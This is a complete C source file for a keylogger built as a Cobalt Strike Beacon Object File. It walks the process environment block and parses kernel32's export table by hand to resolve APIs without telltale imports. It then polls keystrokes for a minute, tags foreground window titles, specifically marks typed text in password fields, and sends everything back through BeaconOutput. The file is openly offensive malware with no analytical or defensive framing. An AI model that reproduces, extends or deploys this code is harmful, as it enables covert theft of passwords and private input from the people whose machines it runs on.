#include <windows.h>
DECLSPEC_IMPORT void __cdecl BeaconOutput(int type, const char* data, int len);
#define CALLBACK_OUTPUT 0x0

// ---------- PEB walk ----------
typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY        InMemoryOrderLinks;
    PVOID             Reserved1[2];
    PVOID             DllBase;
    PVOID             EntryPoint;
    ULONG             SizeOfImage;
    ULONG             _pad;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY;

static BYTE* get_peb(void) {
    BYTE* peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

static int match_kernel32(WCHAR* n, USHORT len_chars) {
    for (USHORT i = 0; i + 8 <= len_chars; i++) {
        WCHAR c0 = n[i+0], c1 = n[i+1], c2 = n[i+2], c3 = n[i+3];
        WCHAR c4 = n[i+4], c5 = n[i+5], c6 = n[i+6], c7 = n[i+7];
        if ((c0=='k'||c0=='K') && (c1=='e'||c1=='E') &&
            (c2=='r'||c2=='R') && (c3=='n'||c3=='N') &&
            (c4=='e'||c4=='E') && (c5=='l'||c5=='L') &&
            (c6=='3') && (c7=='2')) {
            if (i + 8 == len_chars) return 1;
            WCHAR c8 = n[i+8];
            if (c8 == '.' || c8 == '_') return 1;
        }
    }
    return 0;
}

static HMODULE get_kernel32(void) {
    BYTE* peb = get_peb();
    if (!peb) return NULL;
    BYTE* ldr = *(BYTE**)(peb + 0x18);
    if (!ldr) return NULL;
    LIST_ENTRY* head = (LIST_ENTRY*)(ldr + 0x20);
    LIST_ENTRY* cur  = head->Flink;
    int count = 0;
    while (cur != head && count < 200) {
        MY_LDR_DATA_TABLE_ENTRY* e =
            (MY_LDR_DATA_TABLE_ENTRY*)((BYTE*)cur - __builtin_offsetof(MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        if (e->BaseDllName.Buffer && e->BaseDllName.Length > 0) {
            USHORT len_chars = e->BaseDllName.Length / 2;
            if (match_kernel32(e->BaseDllName.Buffer, len_chars))
                return (HMODULE)e->DllBase;
        }
        cur = cur->Flink;
        count++;
    }
    return NULL;
}

// ---------- fn ptrs ----------
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef void    (WINAPI *pSleep)(DWORD);
typedef HWND    (WINAPI *pGetForegroundWindow)(void);
typedef int     (WINAPI *pGetWindowTextA)(HWND, LPSTR, int);
typedef BOOL    (WINAPI *pGetKeyboardState)(PBYTE);
typedef int     (WINAPI *pToUnicode)(UINT, UINT, const BYTE*, LPWSTR, int, UINT);
typedef SHORT   (WINAPI *pGetAsyncKeyState)(int);
typedef BOOL    (WINAPI *pGetGUIThreadInfo)(DWORD, PGUITHREADINFO);
typedef int     (WINAPI *pGetClassNameA)(HWND, LPSTR, int);
typedef LONG    (WINAPI *pGetWindowLongA)(HWND, int);
typedef DWORD   (WINAPI *pGetWindowThreadProcessId)(HWND, LPDWORD);
typedef DWORD   (WINAPI *pGetCurrentThreadId)(void);

static pSleep                   f_Sleep;
static pGetForegroundWindow     f_GetForegroundWindow;
static pGetWindowTextA          f_GetWindowTextA;
static pGetKeyboardState        f_GetKeyboardState;
static pToUnicode               f_ToUnicode;
static pGetAsyncKeyState        f_GetAsyncKeyState;
static pGetGUIThreadInfo        f_GetGUIThreadInfo;
static pGetClassNameA           f_GetClassNameA;
static pGetWindowLongA          f_GetWindowLongA;
static pGetWindowThreadProcessId f_GetWindowThreadProcessId;
static pGetCurrentThreadId      f_GetCurrentThreadId;

// ---------- CRT minimal ----------
static void my_memcpy(void* d, const void* s, int n) {
    unsigned char* dd = (unsigned char*)d;
    const unsigned char* ss = (const unsigned char*)s;
    for (int i = 0; i < n; i++) dd[i] = ss[i];
}
static int my_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}
static void my_strncpy(char* d, const char* s, int n) {
    int i = 0;
    for (; i < n - 1 && s[i]; i++) d[i] = s[i];
    d[i] = 0;
}
static int my_hdr(char* outb, int cap, const char* s) {
    int i = 0;
    if (i < cap - 1) outb[i++] = '\n';
    if (i < cap - 1) outb[i++] = '[';
    while (s && *s && i < cap - 2) outb[i++] = *s++;
    if (i < cap - 1) outb[i++] = ']';
    if (i < cap - 1) outb[i++] = '\n';
    outb[i] = 0;
    return i;
}

// ---------- state ----------
static char g_buf[8192];
static int  g_buflen = 0;
static HWND g_last_hwnd = NULL;
static HWND g_last_focus = NULL;
static int  g_in_password = 0;
static unsigned char g_down[256] = {0};

static void out(const char* s, int n) { BeaconOutput(CALLBACK_OUTPUT, s, n); }

static void flush_buf(void) {
    if (g_buflen > 0) {
        BeaconOutput(CALLBACK_OUTPUT, g_buf, g_buflen);
        g_buflen = 0;
    }
}

static void append(const char* s, int n) {
    if (g_buflen + n > (int)sizeof(g_buf) - 1) flush_buf();
    if (g_buflen + n <= (int)sizeof(g_buf) - 1) {
        my_memcpy(g_buf + g_buflen, s, n);
        g_buflen += n;
    }
}

static int is_password_field(HWND hwndFocus) {
    if (!hwndFocus) return 0;
    char cls[64] = {0};
    f_GetClassNameA(hwndFocus, cls, sizeof(cls) - 1);
    if (my_strcmp(cls, "Edit") != 0) return 0;
    LONG style = f_GetWindowLongA(hwndFocus, GWL_STYLE);
    if (style & ES_PASSWORD) return 1;
    return 0;
}

static void capture_context(void) {
    HWND hwndFg = f_GetForegroundWindow();
    if (!hwndFg) return;

    
    if (hwndFg != g_last_hwnd) {
        g_last_hwnd = hwndFg;
        char title[256] = {0};
        f_GetWindowTextA(hwndFg, title, sizeof(title) - 1);
        char hdr[300];
        int n = my_hdr(hdr, sizeof(hdr), title);
        if (n > 0) { flush_buf(); append(hdr, n); }
    }

    // password ?
    GUITHREADINFO gti = {0};
    gti.cbSize = sizeof(gti);
    DWORD tid = f_GetWindowThreadProcessId(hwndFg, NULL);
    HWND hwndFocus = NULL;
    if (tid && f_GetGUIThreadInfo(tid, &gti)) {
        hwndFocus = gti.hwndFocus;
    }

    if (hwndFocus != g_last_focus) {
        g_last_focus = hwndFocus;
        int was_pwd = g_in_password;
        g_in_password = is_password_field(hwndFocus);
        if (g_in_password && !was_pwd) {
            flush_buf();
            append("\n[PASSWORD]\n", 12);
        } else if (!g_in_password && was_pwd) {
            flush_buf();
            append("\n[END PASSWORD]\n", 16);
        }
    }
}

static void emit_vk(int vk) {
    switch (vk) {
        case VK_RETURN:  append("\n", 1); return;
        case VK_TAB:     append("\t", 1); return;
        case VK_BACK:    append("<BS>", 4); return;
        case VK_ESCAPE:  append("<ESC>", 5); return;
        case VK_DELETE:  append("<DEL>", 5); return;
        case VK_LEFT:    append("<L>", 3); return;
        case VK_RIGHT:   append("<R>", 3); return;
        case VK_UP:      append("<U>", 3); return;
        case VK_DOWN:    append("<D>", 3); return;
        case VK_HOME:    append("<HOME>", 6); return;
        case VK_END:     append("<END>", 5); return;
        case VK_PRIOR:   append("<PGUP>", 6); return;
        case VK_NEXT:    append("<PGDN>", 6); return;
    }
    if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT ||
        vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
        vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ||
        vk == VK_LWIN || vk == VK_RWIN) return;

    BYTE kb[256] = {0};
    f_GetKeyboardState(kb);
    WCHAR wbuf[8] = {0};
    int   wlen    = f_ToUnicode((UINT)vk, 0, kb, wbuf, 8, 0);
    if (wlen > 0) {
        for (int i = 0; i < wlen; i++) {
            if (wbuf[i] >= 0x20 && wbuf[i] < 0x7F) {
                char c = (char)wbuf[i];
                append(&c, 1);
            } else if (wbuf[i] == 0x0D) {
                append("\n", 1);
            }
        }
    }
}

static void poll_keys(void) {
    static const unsigned char vks[] = {
        0x08, 0x09, 0x0D, 0x1B, 0x20,
        0x25, 0x26, 0x27, 0x28, 0x2D, 0x2E,
        0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,
        0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,
        0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A,
        0xBA,0xBB,0xBC,0xBD,0xBE,0xBF,0xC0,0xDB,0xDC,0xDD,0xDE
    };
    int n = (int)(sizeof(vks)/sizeof(vks[0]));
    for (int k = 0; k < n; k++) {
        int vk = vks[k];
        SHORT st = f_GetAsyncKeyState(vk);
        if (st & 0x8000) {
            if (!g_down[vk]) {
                g_down[vk] = 1;
                capture_context();
                emit_vk(vk);
            }
        } else {
            g_down[vk] = 0;
        }
    }
}

// ---------- resolve ----------
static void resolve(void) {
    HMODULE hK32 = get_kernel32();
    if (!hK32) { out("fail: kernel32\n", 15); return; }

    pGetProcAddress GPA = NULL;
    BYTE* base = (BYTE*)hK32;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { out("fail: dos\n", 10); return; }
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { out("fail: nt\n", 9); return; }

    IMAGE_DATA_DIRECTORY exp = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp.VirtualAddress) { out("fail: exp\n", 10); return; }
    IMAGE_EXPORT_DIRECTORY* ed = (IMAGE_EXPORT_DIRECTORY*)(base + exp.VirtualAddress);
    DWORD* names = (DWORD*)(base + ed->AddressOfNames);
    WORD*  ords  = (WORD*)(base + ed->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + ed->AddressOfFunctions);

    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        const char* nm = (const char*)(base + names[i]);
        if (nm[0]=='G' && nm[1]=='e' && nm[2]=='t' && nm[3]=='P' &&
            nm[4]=='r' && nm[5]=='o' && nm[6]=='c' && nm[7]=='A' &&
            nm[8]=='d' && nm[9]=='d' && nm[10]=='r' && nm[11]=='e' &&
            nm[12]=='s' && nm[13]=='s' && nm[14]==0) {
            GPA = (pGetProcAddress)(base + funcs[ords[i]]);
            break;
        }
    }
    if (!GPA) { out("fail: GPA\n", 10); return; }

    pLoadLibraryA LLA = (pLoadLibraryA)GPA(hK32, "LoadLibraryA");
    if (!LLA) { out("fail: LLA\n", 10); return; }

    HMODULE hU32 = LLA("user32.dll");
    if (!hU32) { out("fail: user32\n", 13); return; }

    f_GetForegroundWindow      = (pGetForegroundWindow)GPA(hU32, "GetForegroundWindow");
    f_GetWindowTextA           = (pGetWindowTextA)GPA(hU32, "GetWindowTextA");
    f_GetKeyboardState         = (pGetKeyboardState)GPA(hU32, "GetKeyboardState");
    f_ToUnicode                = (pToUnicode)GPA(hU32, "ToUnicode");
    f_GetAsyncKeyState         = (pGetAsyncKeyState)GPA(hU32, "GetAsyncKeyState");
    f_GetGUIThreadInfo         = (pGetGUIThreadInfo)GPA(hU32, "GetGUIThreadInfo");
    f_GetClassNameA            = (pGetClassNameA)GPA(hU32, "GetClassNameA");
    f_GetWindowLongA           = (pGetWindowLongA)GPA(hU32, "GetWindowLongA");
    f_GetWindowThreadProcessId = (pGetWindowThreadProcessId)GPA(hU32, "GetWindowThreadProcessId");
    f_GetCurrentThreadId       = (pGetCurrentThreadId)GPA(hK32, "GetCurrentThreadId");
    f_Sleep                    = (pSleep)GPA(hK32, "Sleep");

    if (!f_GetForegroundWindow || !f_GetWindowTextA || !f_GetKeyboardState ||
        !f_ToUnicode || !f_GetAsyncKeyState || !f_GetGUIThreadInfo ||
        !f_GetClassNameA || !f_GetWindowLongA || !f_GetWindowThreadProcessId ||
        !f_Sleep) {
        out("fail: ptrs\n", 11);
        return;
    }
    out("ready\n", 6);
}

// ---------- entry ----------
void go(char* args, int len) {
    (void)args; (void)len;

    resolve();

    if (!f_GetAsyncKeyState || !f_Sleep) return;

    int ticks = 60 * 40;   // 60s * 25ms
    for (int i = 0; i < ticks; i++) {
        poll_keys();
        if ((i % 40) == 0) flush_buf();
        f_Sleep(25);
    }
    flush_buf();
}
